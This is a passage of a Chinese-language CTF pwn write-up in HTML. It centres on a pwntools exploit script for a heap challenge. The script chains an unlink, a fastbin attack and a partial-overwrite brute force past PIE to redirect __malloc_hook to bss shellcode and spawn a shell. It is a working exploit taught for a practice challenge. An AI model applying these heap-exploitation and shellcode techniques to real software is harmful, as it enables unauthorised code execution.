class="comment">#由于不能泄露地址，但是由于PIE的缺陷,符号的地址的后3个十六进制数字和它在  </span></span><br><span class="line"><span class="comment">#二进制文件中的地址的后三个十六进制数是一样的。然后，我们就直接设定倒数第  </span></span><br><span class="line"><span class="comment">#个十六进制数字为2，这样，我们不断爆破，总有一次，它的后4个十六进制数字为  </span></span><br><span class="line"><span class="comment">#这个  </span></span><br><span class="line">attack_addr_suffix = <span class="number">4096</span> * <span class="number">2</span> + ((malloc_hook &amp; <span class="number">0xFFF</span>) - <span class="number">0x23</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#shellcode  </span></span><br><span class="line">shellcode = asm(shellcraft.sh())  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">sh,size,content</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))  </span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Data: &#x27;</span>,content)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">sh,index,size,content</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))  </span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Data: &#x27;</span>,content)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">sh,index</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack</span>(<span class="params">sh</span>):  </span><br><span class="line">   <span class="comment">#chunk0  </span></span><br><span class="line">   create(sh,<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)  </span><br><span class="line">   <span class="comment">#chunk1  </span></span><br><span class="line">   create(sh,<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x100</span>)  </span><br><span class="line">   <span class="comment">#我们首先需要来完成任意写的目的，这个地址处是一个数组，用来保存堆指针的。我们需要先控制这里  </span></span><br><span class="line">   target_addr = <span class="number">0x601040</span>  </span><br><span class="line">   <span class="comment">#构造payload使得chunk0溢出到chunk1,修改chunk1的prev_size和size  </span></span><br><span class="line">   <span class="comment">#假chunk  </span></span><br><span class="line">   <span class="comment">#prev_size size  </span></span><br><span class="line">   payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>)  </span><br><span class="line">   <span class="comment">#fd、bk  </span></span><br><span class="line">   payload += p64(target_addr-<span class="number">0x18</span>) + p64(target_addr - <span class="number">0x10</span>)  </span><br><span class="line">   payload += <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x100</span>-<span class="number">8</span>*<span class="number">4</span>)  </span><br><span class="line">   <span class="comment">#修改chunk3的prev_size和size  </span></span><br><span class="line">   payload += p64(<span class="number">0x100</span>) + p64(<span class="number">0x110</span>)  </span><br><span class="line">  </span><br><span class="line">   edit(sh,<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)  </span><br><span class="line">   <span class="comment">#发生unlink,chunk0的指针指向了保存堆指针的数组，那么我们就可以修改数组里的指针，让它们指向一些关键地方  </span></span><br><span class="line">   delete(sh,<span class="number">1</span>)  </span><br><span class="line">   payload = p64(<span class="number">0</span>) * <span class="number">3</span>  </span><br><span class="line">   payload += p64(bss_addr)  </span><br><span class="line">   <span class="comment">#将堆0指针变成bss_addr，这样我们就可以往bss里写shellcode了  </span></span><br><span class="line">   edit(sh,<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)  </span><br><span class="line">  </span><br><span class="line">   <span class="comment">#chunk2  </span></span><br><span class="line">   create(sh,<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)  </span><br><span class="line">   <span class="comment">#chunk3 这个必须是unsorted bin范围  </span></span><br><span class="line">   create(sh,<span class="number">0x80</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x80</span>)  </span><br><span class="line">   <span class="comment">#chunk4  </span></span><br><span class="line">   create(sh,<span class="number">0x65</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x65</span>)  </span><br><span class="line">   <span class="comment">#chunk5  </span></span><br><span class="line">   create(sh,<span class="number">0x65</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x65</span>)  </span><br><span class="line">   <span class="comment">#free chunk3后，chunk3的fd和bk残留了libc里面的main_area + 0x88指针  </span></span><br><span class="line">   delete(sh,<span class="number">3</span>)  </span><br><span class="line">  </span><br><span class="line">   <span class="comment">#覆盖低2字节，使得chunk3的FD指向了malloc hook-0x23  </span></span><br><span class="line">   create(sh,<span class="number">0x80</span>,p16(attack_addr_suffix)) <span class="comment">#chunk6  </span></span><br><span class="line">   <span class="comment">#修改chunk3的size，目的是让chunk3和chunk5、chunk4的size一样  </span></span><br><span class="line">   payload = <span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>  </span><br><span class="line">   payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)  </span><br><span class="line">   edit(sh,<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)  </span><br><span class="line">   <span class="comment">#释放chunk4、chunk5，这样chunk5、chunk4构成了fastbin单向链表  </span></span><br><span class="line">   delete(sh,<span class="number">4</span>)  </span><br><span class="line">   delete(sh,<span class="number">5</span>)  </span><br><span class="line">   <span class="comment">#我们覆盖chunk5的fd的低1字节，目的是让chunk5的fd指向chunk3，因为我们不确定chunk3的地址，当我们确定它地址的最后一个字节。  </span></span><br><span class="line">   edit(sh,<span class="number">5</span>,<span class="number">1</span>,p8(<span class="number">0x30</span>))  </span><br><span class="line">  </span><br><span class="line">   <span class="comment">#在bss段写入shellcode，顺便把堆指针从数组里清空，这样我们又创建多个堆了，不然超过10个就不允许创建了  </span></span><br><span class="line">   payload = shellcode.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">   payload += p64(<span class="number">0</span>) * <span class="number">8</span>  </span><br><span class="line">   edit(sh,<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)  </span><br><span class="line">  </span><br><span class="line">   <span class="comment">#chunk7  </span></span><br><span class="line">   create(sh,<span class="number">0x65</span>,<span class="string">&#x27;g&#x27;</span>*<span class="number">0x65</span>)  </span><br><span class="line">   <span class="comment">#chunk8  </span></span><br><span class="line">   create(sh,<span class="number">0x65</span>,<span class="string">&#x27;h&#x27;</span>*<span class="number">0x65</span>)  </span><br><span class="line">  </span><br><span class="line">   payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x13</span> + p64(bss_addr)  </span><br><span class="line">   <span class="comment">#这个堆的指针指向了__malloc hook,我们修改它的值为bss_addr，这样，当我们再次malloc时，就会调用bss_addr处的shellcode  </span></span><br><span class="line">   create(sh,<span class="number">0x65</span>,payload) <span class="comment">#chunk9  </span></span><br><span class="line">   <span class="comment">#当我们再次malloc时，malloc hook执行的函数被调用,我们getshell  </span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   sh.interactive()  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#爆破  </span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line"><span class="comment">#   sh = remote(&#x27;111.198.29.45&#x27;,59617)  </span></span><br><span class="line">   sh = process(<span class="string">&#x27;./timu&#x27;</span>)  </span><br><span class="line">   <span class="keyword">try</span>:  </span><br><span class="line">      <span class="built_in">print</span> <span class="string">&#x27;正在爆破...&#x27;</span>  </span><br><span class="line">      crack(sh)  </span><br><span class="line">      <span class="keyword">break</span>  </span><br><span class="line">   <span class="keyword">except</span>:  </span><br><span class="line">      sh.close()  </span><br></pre></td></tr></table></figure>
+
+<p>成功getshell</p>
+<img src="/ha1vk/2019/11/13/Noleak/image19.JPG" class="">
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/unlink/" rel="tag"># unlink</a>
+              <a href="/ha1vk/tags/unsorted-bin/" rel="tag"># unsorted bin</a>
+              <a href="/ha1vk/tags/partial-write-bypass-PIE/" rel="tag"># partial write bypass PIE</a>
+              <a href="/ha1vk/tags/fastbin/" rel="tag"># fastbin</a>
+              <a href="/ha1vk/tags/malloc-hook/" rel="tag"># malloc_hook</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2019/11/10/note-service2/" rel="prev" title="note-service2">
+      <i class="fa fa-chevron-left"></i> note-service2
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2019/11/15/EasyPwn/" rel="next" title="WHCTF2017-EasyPwn">
+      WHCTF2017-EasyPwn <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Malloc-hook"><span class="nav-number">1.</span> <span class="nav-text">Malloc hook</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Unsorted-bin-unlink"><span class="nav-number">2.</span> <span class="nav-text">Unsorted bin unlink</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin-attack"><span class="nav-number">3.</span> <span class="nav-text">fastbin attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#partial-write"><span class="nav-number">4.</span> <span class="nav-text">partial write</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
